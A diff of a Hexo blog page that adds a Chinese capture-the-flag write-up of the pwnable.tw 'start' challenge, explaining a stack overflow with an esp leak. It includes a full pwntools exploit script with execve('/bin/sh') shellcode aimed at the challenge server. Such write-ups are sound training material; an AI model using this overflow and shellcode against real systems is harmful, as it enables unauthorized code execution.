@@ -139,10 +139,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="http://l0tus.vip/archives/2023/02/">
+  <link rel="canonical" href="http://l0tus.vip/cn/pwnable.tw-start-WP/">
   <title>
     
-      l0tus&#39; blog
+      pwnable.tw-start-WP - l0tus&#39; blog
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -239,7 +239,7 @@
       <div class="navbar-collapse">
         <ul class="nav navbar-nav navbar-right">
           <li>
-            <a href="/">HOME</a>
+            <a href="/">首页</a>
           </li>
 
           
@@ -249,7 +249,7 @@
           <li>
             <a href="/about/">
               
-              ABOUT
+              关于
               
               
             </a>
@@ -260,7 +260,7 @@
           <li>
             <a href="/categories/">
               
-              CATEGORIES
+              分类
               
               
             </a>
@@ -271,7 +271,7 @@
           <li>
             <a href="/archive/">
               
-              ARCHIVES
+              归档
               
               
             </a>
@@ -282,7 +282,7 @@
           <li>
             <a href="/tags/">
               
-              TAGS
+              标签
               
               
             </a>
@@ -293,36 +293,14 @@
           
           <li>
             <a class="popup-trigger">
-              <span class="search-icon"></span>SEARCH</a>
+              <span class="search-icon"></span>搜索</a>
           </li>
           
 
           <!-- LangSelect -->
           
           
-          <!-- LangSelect start -->
-          <!-- LangSelect -->
-<li>
-  <a id="lang-select-label"><i class="fa fa-globe"></i>
-    <span>
-      English
-    </span>
-    <select id="lang-select" data-canonical="archives/2023/02/index.html">
-      
-      
-      <option value="en"  selected >
-        English
-      </option>
-      
-      <option value="cn" >
-        简体中文
-      </option>
-      
-    </select>
-  </a>
-</li>
-
-          <!-- LangSelect end -->
+          
           
           
         </ul>
@@ -374,19 +352,19 @@
     .body--light {
       /* intro-header */
       --intro-header-background-image-url-home: url('/img/header_img/cat.png');
-      --intro-header-background-image-url-post: url('');
-      --intro-header-background-image-url-page: url('//img/header_img/snow_header.png');
+      --intro-header-background-image-url-post: url('/img/header_img/pwnable_header.png');
+      --intro-header-background-image-url-page: url('//img/header_img/pwnable_header.png');
     }
     .body--dark {
       --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/cat.png');
-      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('');
-      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//img/header_img/snow_header.png');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/pwnable_header.png');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//img/header_img/pwnable_header.png');
     }
 
     header.intro-header {
-       /*page*/
-        background-image: var(--intro-header-background-image-url-page);
-        /* background-image: url('//img/header_img/snow_header.png'); */
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('/img/header_img/pwnable_header.png'); */
       
     }
 
@@ -408,10 +386,44 @@
       <div class="row">
         <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
           
-          <div class="site-heading">
-            <h1>l0tus&#39;s blog</h1>
-            <!--<hr class="small">-->
-            <span class="subheading">朱颜长似、头上花枝，岁岁年年</span>
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#pwn笔记" title="pwn笔记">pwn笔记</a>
+              
+              <a class="tag" href="/tags/#write up" title="write up">write up</a>
+              
+            </div>
+            <h1>pwnable.tw-start-WP</h1>
+            <h2 class="subheading">两小时做了第一题，不愧是pwnable.tw</h2>
+            <span class="meta">
+              Posted by l0tus on
+              2023-02-15
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count">1</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">466</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
           </div>
           
         </div>
@@ -452,533 +464,335 @@
 	Friends Blog、
 	anchorjs、
 	) -->
-		<!-- Main Content -->
-<div class="container">
-  <div class="row">
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+
+        <p>现阶段就是复现难题的同时四处找题目刷，<a target="_blank" rel="noopener" href="http://xn--pwnable-b54k99ij93a6sb9w5a.tw">今天开始做pwnable.tw</a>。结果这第一道名为start的题目就做了挺久的。</p>
+<h1>start</h1>
+<p><img src="start_4.png" alt="pic1"><br>
+和国内常见的起始题目完全不同的风格，程序通过很短的汇编实现了write、read<br>
+看着不像是用ROP的做法，保护全关了，这里考虑利用NX关闭，堆栈可执行实现shellcode<br>
+光看汇编比较抽象，自己画一下示意图<br>
+<img src="start_3.png" alt="pic2"><br>
+这个是起始的栈示意图，注意到程序开头push了esp，并且后边实现了write，而且read的写入长度参数是0x3c，可以做到溢出覆盖返回地址。利用write将栈中的esp输出<br>
+<img src="start_5.png" alt="pic3"><br>
+图右是第一次覆盖之后的，利用0x08048087这一段汇编输出esp<br>
+<img src="start_1.png" alt="pic5"><br>
+这是泄露出来的esp<br>
+<img src="start_6.png" alt="pic4"><br>
+再次覆盖后示意如图，执行到esp+14h就到了retn，就可以用我们自己的eip控制程序执行的ip，从而执行shellcode<br>
+<img src="start_7.png" alt="pic6"><br>
+远程反应比较慢，而且目有点复杂，还需要自己翻一下才能找到flag。<br>
+这题使我感受到了比较专业的pwn学习网站的质量，做完觉得是比较简单的题，但是刚拿到手也是没有头绪的。<br>
+题目风格也是很二进制的，蛮不错的<br>
+pwnable.tw值得继续刷</p>
+<h1>exp</h1>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./start&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x8048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.01</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;CTF:&quot;</span>)</span><br><span class="line">esp=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;esp = &quot;</span>,<span class="built_in">str</span>(<span class="built_in">hex</span>(esp)))</span><br><span class="line">eip=esp+<span class="number">0x14</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;\n&#x27;</span>.join([</span><br><span class="line">    <span class="string">&#x27;push %d&#x27;</span> % u32(<span class="string">&#x27;/sh\0&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;push %d&#x27;</span> % u32(<span class="string">&#x27;/bin&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;xor edx, edx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xor ecx, ecx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov ebx, esp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov eax, 0xb&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;int 0x80&#x27;</span>,</span><br><span class="line">]))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(eip)+shellcode</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
+          
+          
+          <li class="next">
+            <a href="/cn/XCTF-babyheap-WP/" data-toggle="tooltip" data-placement="top" title="XCTF-babyheap-WP">Next Post &rarr;</a>
+          </li>
+          
+        </ul>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      如果您喜欢此博客或发现它对您有用，则欢迎对此发表评论。 也欢迎您共享此博客，以便更多人可以参与。 如果博客中使用的图像侵犯了您的版权，请与作者联系以将其删除。 谢谢 ！
+    
+  </p>
+</div>
+<!-- tip end -->
+
+        <!-- tip end -->
+        
+
+        
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=pwnable.tw-start-WP&body=Hi,I found this website and thought you might like it http://l0tus.vip/cn/pwnable.tw-start-WP/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
+        
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+  <!-- gitalk start -->
+  <!-- Docs:https://github.com/gitalk/gitalk/blob/master/readme-cn.md -->
+
+  <div id="gitalk-container"></div>
+
+  
+    <!-- <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.js"></script> -->
+    <script src="/js/comment/gitalk.js"></script>
+  
+
+  <script>
+    var gitalk = new Gitalk({
+      clientID: '',
+      clientSecret: '',
+      repo: '',
+      owner: '',
+      admin: '',
+      id: 'Wed Feb 15 2023 16:33:00 GMT+0800', // Ensure uniqueness and length less than 50
+      distractionFreeMode: false, // Facebook-like distraction free mode
+      perPage: 10,
+      pagerDirection: 'last',
+      createIssueManually: false,
+      language: 'en',
+      proxy: 'https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token'
+    });
+    gitalk.render('gitalk-container');
+
+    var gtFolded = () => {
+      setTimeout(function () {
+        let markdownBody = document.getElementsByClassName("markdown-body");
+        let list = Array.from(markdownBody);
+        list.forEach(item => {
+          if (item.clientHeight > 250) {
+            item.classList.add('gt-comment-body-folded');
+            item.style.maxHeight = '250px';
+            item.title = 'Click to Expand';
+            item.onclick = function () {
+              item.classList.remove('gt-comment-body-folded');
+              item.style.maxHeight = '';
+              item.title = '';
+              item.onclick = null;
+            };
+          }
+        })
+      }, 800);
+    }
+  </script>
+
+  <!-- gitalk end -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <hr>
+
+      </div>
+
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">目录</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">start</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">exp</span></a></li></ol>
+        
+        </div>
+      </aside>
     
 
-    <!-- USE SIDEBAR -->
-    <!-- Post Container -->
-    <div class="
+
+
+      <!-- Sidebar Container -->
+      <div class="
                 col-lg-8 col-lg-offset-1
-                col-md-8 col-md-offset-1
-                col-sm-12
-                col-xs-12
-                post-container
-            ">
+                col-md-10 col-md-offset-1
+                sidebar-container">
 
-      <!-- Main Content -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-8 col-lg-offset-0 col-md-10 col-md-offset-1">
-      <!-- 归档列表 -->
-
-      
-
-      <!-- 归档列表 -->
-      
-      <div class="one-tag-list">
-        <span class="fa fa-calendar-times-o listing-seperator" id="2023">
-          <span class="tag-text">2023</span>
-        </span>
-        <ul>
-          
-          <li>
-            02-15
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/pwnable.tw-start-WP/" style="color: #0085a1">
-              <span>
-                pwnable.tw-start-WP
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            02-14
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/XCTF-dice_game-WP/" style="color: #0085a1">
-              <span>
-                XCTF-dice_game-WP
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            02-14
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/XCTF-babyheap-WP/" style="color: #0085a1">
-              <span>
-                XCTF-babyheap-WP
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            02-02
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/2023西湖论剑/" style="color: #0085a1">
-              <span>
-                2023西湖论剑 部分pwn题WP
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            01-29
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/JS 的一些特性：原型链，作用域，闭包/" style="color: #0085a1">
-              <span>
-                JS的一些特性：原型链，作用域，闭包
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-        </ul>
-      </div>
-      
-      <div class="one-tag-list">
-        <span class="fa fa-calendar-times-o listing-seperator" id="2022">
-          <span class="tag-text">2022</span>
-        </span>
-        <ul>
-          
-          <li>
-            12-31
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/2022年终总结/" style="color: #0085a1">
-              <span>
-                2022年终总结
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            12-16
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/省赛babyheap/" style="color: #0085a1">
-              <span>
-                迟到三个月的省赛wp
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            12-15
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/stackmove/" style="color: #0085a1">
-              <span>
-                Stackmove
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            12-14
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/ez_heap/" style="color: #0085a1">
-              <span>
-                tcache_poisoning
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            12-13
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/POC_double_free/" style="color: #0085a1">
-              <span>
-                PoC double_free
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            12-11
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/heap/" style="color: #0085a1">
-              <span>
-                HEAP
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-28
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/XCTF-stack2-WP/" style="color: #0085a1">
-              <span>
-                XCTF-stack2-WP
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-22
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/ret2syscall/" style="color: #0085a1">
-              <span>
-                ret2syscall
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-12
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/实时数据监测wp/" style="color: #0085a1">
-              <span>
-                XCTF-实时数据检测-WP
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-10
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/ret2libc/" style="color: #0085a1">
-              <span>
-                ret2libc
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-        </ul>
-      </div>
-      
-    </div>
-  </div>
-</div>
-
-
-      <!-- 如果开启评论功能 -->
-      
-    </div>
-
-    <!-- Sidebar Container -->
-<div class="
-    col-lg-3 col-lg-offset-0
-    col-md-3 col-md-offset-0
-    col-sm-12
-    col-xs-12
-    sidebar-container
-">
-    
-        <!-- Visitors -->
-<h5><a href="/">VISITORS</a></h5>
-
-<div class="widget">
-  <span>
-    Viewed <b><i><span id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></span></i></b> Times
-  </span>
-  <br />
-  <span>
-    <b><i><span id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></span></i></b> Visitors In Total
-  </span>
-</div>
-
-
-        <hr>
-    
         <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">特色标签</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#pwn笔记" title="pwn笔记">pwn笔记</a>
+            
+            <a class="tag" href="/tags/#write up" title="write up">write up</a>
+            
+          </div>
+        </section>
+        
 
-<section>
-  <h5><a href="/tags/">FEATURED TAGS</a></h5>
-  <div class="tags">
-    
-    
-    <a href="/tags/#年终总结" title="年终总结" rel="1">年终总结</a>
-    
-    
-    
-    <a href="/tags/#pwn笔记" title="pwn笔记" rel="13">pwn笔记</a>
-    
-    
-    
-    <a href="/tags/#write up" title="write up" rel="9">write up</a>
-    
-    
-    
-    <a href="/tags/#JS" title="JS" rel="1">JS</a>
-    
-    
-    
-    <a href="/tags/#转载" title="转载" rel="1">转载</a>
-    
-    
-    
-    <a href="/tags/#heap" title="heap" rel="2">heap</a>
-    
-    
-    
-    <a href="/tags/#PoC" title="PoC" rel="1">PoC</a>
-    
-    
-    
-    <a href="/tags/#stackmove" title="stackmove" rel="1">stackmove</a>
-    
-    
-  </div>
-</section>
-
-
-        <hr>
-    
-        <!-- Short About -->
-<section class="visible-md visible-lg">
-  <h5><a href="/about/">ABOUT ME</a></h5>
-  <div class="short-about">
-
-    
-    <img id="avatar_pic" src="/img/avatar/diluc.jpg" alt="avatar_pic" style="box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -moz-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -webkit-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);" />
-    
-
-    
-    <p>Vidar-Team | PWN</p>
-    
-
-    <!-- SNS Link -->
-    <ul class="list-inline">
-      
-
-      
-      <li>
-        <a target="_blank" href="https://github.com/ChrisL0tus">
-          <span class="fa-stack fa-lg">
-            <i class="fa fa-circle fa-stack-2x"></i>
-            <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-          </span>
-        </a>
-      </li>
-      
-
-      
-      <li>
-        <a target="_blank" href="https://twitter.com/Lotus_Chris_">
-          <span class="fa-stack fa-lg">
-            <i class="fa fa-circle fa-stack-2x"></i>
-            <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
-          </span>
-        </a>
-      </li>
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-    </ul>
-  </div>
-</section>
-
-        <hr>
-    
-        <!-- RECENT POSTS -->
-
-<h5><a href="/">RECENT POSTS</a></h5>
-<div class="widget">
-  <ul>
-    
-    <a href="../../../cn/pwnable.tw-start-WP/">
-      <li>pwnable.tw-start-WP</li>
-    </a>
-    
-    <a href="../../../cn/XCTF-babyheap-WP/">
-      <li>XCTF-babyheap-WP</li>
-    </a>
-    
-    <a href="../../../cn/XCTF-dice_game-WP/">
-      <li>XCTF-dice_game-WP</li>
-    </a>
-    
-    <a href="../../../cn/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">
-      <li>2023西湖论剑 部分pwn题WP</li>
-    </a>
-    
-    <a href="../../../cn/JS%20%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7%EF%BC%9A%E5%8E%9F%E5%9E%8B%E9%93%BE%EF%BC%8C%E4%BD%9C%E7%94%A8%E5%9F%9F%EF%BC%8C%E9%97%AD%E5%8C%85/">
-      <li>JS的一些特性：原型链，作用域，闭包</li>
-    </a>
-    
-  </ul>
-</div>
-
-
-        <hr>
-    
         <!-- Friends Blog -->
-
-<h5><a href="/">FRIENDS</a></h5>
-<ul class="list-inline">
-  
-  <li><a href="https://blog.t0hka.top" target="_blank">t0hka</a></li>
-  
-  <li><a href="https://ek1ng.com" target="_blank">ek1ng</a></li>
-  
-  <li><a href="https://github.red/" target="_blank">e99p1ant</a></li>
-  
-  <li><a href="https://jalenz.cn" target="_blank">Jalen</a></li>
-  
-  <li><a href="https://blog.tiphareth.cn/" target="_blank">Tiphareth</a></li>
-  
-  <li><a href="https://www.hakuya.work/" target="_blank">白夜</a></li>
-  
-  <li><a href="https://eson.ninja/" target="_blank">esonhugh</a></li>
-  
-  <li><a href="https://me.liki.link/" target="_blank">liki</a></li>
-  
-  <li><a href="https://xyxsw.ltd/" target="_blank">TS</a></li>
-  
-  <li><a href="https://blog.hiirachan.moe/" target="_blank">Doddy</a></li>
-  
-  <li><a href="https://cjovi.icu/" target="_blank">chuj</a></li>
-  
-  <li><a href="https://JBNRZ.com.cn" target="_blank">RZ</a></li>
-  
-  <li><a href="http://gtg.ink/" target="_blank">gtg</a></li>
-  
-  <li><a href="https://baimeow.cn" target="_blank">Baimeow</a></li>
-  
-  <li><a href="http://www.luelueking.com/" target="_blank">luelueking</a></li>
-  
-  <li><a href="https://mmmmchong.github.io" target="_blank">humb1e</a></li>
-  
-</ul>
-
-
+        
         <hr>
-    
-        <!-- Archives -->
+        <h5>链友</h5>
+        <ul class="list-inline">
 
-<h5><a href="/archives/">archives</a></h5>
-<div class="widget">
-  <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="">February 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="../01/">January 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../2022/12/">December 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../2022/09/">September 2022</a><span class="archive-list-count">4</span></li></ul>
-</div>
-
-
-        <hr>
-    
-        <!-- Categories -->
-
-<h5><a href="/categories/">categories</a></h5>
-<div class="widget">
-  <ul>
-    
-    <a href="/categories/#2022年终总结">
-      <li>2022年终总结</li>
-    </a>
-    
-    <a href="/categories/#2023西湖论剑">
-      <li>2023西湖论剑</li>
-    </a>
-    
-    <a href="/categories/#JS的一些特性：原型链，作用域，闭包">
-      <li>JS的一些特性：原型链，作用域，闭包</li>
-    </a>
-    
-    <a href="/categories/#PoC double_free">
-      <li>PoC double_free</li>
-    </a>
-    
-    <a href="/categories/#XCTF">
-      <li>XCTF</li>
-    </a>
-    
-    <a href="/categories/#tcache_poisoning">
-      <li>tcache_poisoning</li>
-    </a>
-    
-    <a href="/categories/#pwnable.tw">
-      <li>pwnable.tw</li>
-    </a>
-    
-    <a href="/categories/#HEAP">
-      <li>HEAP</li>
-    </a>
-    
-    <a href="/categories/#ret2libc">
-      <li>ret2libc</li>
-    </a>
-    
-    <a href="/categories/#ret2syscall">
-      <li>ret2syscall</li>
-    </a>
-    
-    <a href="/categories/#Stackmove">
-      <li>Stackmove</li>
-    </a>
-    
-    <a href="/categories/#XCTF-实时数据检测-WP">
-      <li>XCTF-实时数据检测-WP</li>
-    </a>
-    
-    <a href="/categories/#2022浙江省赛">
-      <li>2022浙江省赛</li>
-    </a>
-    
-  </ul>
-</div>
-
-
-        <hr>
-    
-</div>
-
-
-    
+          
+          <li>
+            <a href="https://blog.t0hka.top" target="_blank">t0hka</a>
+          </li>
+          
+          <li>
+            <a href="https://ek1ng.com" target="_blank">ek1ng</a>
+          </li>
+          
+          <li>
+            <a href="https://github.red/" target="_blank">e99p1ant</a>
+          </li>
+          
+          <li>
+            <a href="https://jalenz.cn" target="_blank">Jalen</a>
+          </li>
+          
+          <li>
+            <a href="https://blog.tiphareth.cn/" target="_blank">Tiphareth</a>
+          </li>
+          
+          <li>
+            <a href="https://www.hakuya.work/" target="_blank">白夜</a>
+          </li>
+          
+          <li>
+            <a href="https://eson.ninja/" target="_blank">esonhugh</a>
+          </li>
+          
+          <li>
+            <a href="https://me.liki.link/" target="_blank">liki</a>
+          </li>
+          
+          <li>
+            <a href="https://xyxsw.ltd/" target="_blank">TS</a>
+          </li>
+          
+          <li>
+            <a href="https://blog.hiirachan.moe/" target="_blank">Doddy</a>
+          </li>
+          
+          <li>
+            <a href="https://cjovi.icu/" target="_blank">chuj</a>
+          </li>
+          
+          <li>
+            <a href="https://JBNRZ.com.cn" target="_blank">RZ</a>
+          </li>
+          
+          <li>
+            <a href="http://gtg.ink/" target="_blank">gtg</a>
+          </li>
+          
+          <li>
+            <a href="https://baimeow.cn" target="_blank">Baimeow</a>
+          </li>
+          
+          <li>
+            <a href="http://www.luelueking.com/" target="_blank">luelueking</a>
+          </li>
+          
+          <li>
+            <a href="https://mmmmchong.github.io" target="_blank">humb1e</a>
+          </li>
+          
+        </ul>
+        
+      </div>
+    </div>
   </div>
-</div>
+</article>
+
+
+
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+<!-- anchorjs end -->
+
 
 
 		<!-- Footer (contains ThemeColor、viewer) -->
@@ -1152,7 +966,7 @@ start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </scrip
             <span class="search-icon">
               <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
             </span>
-            <input autocomplete="off" placeholder="SEARCH..." type="text" id="local-search-input">
+            <input autocomplete="off" placeholder="搜索..." type="text" id="local-search-input">
           </div>
         </div>
         <div id="local-search-result"></div>
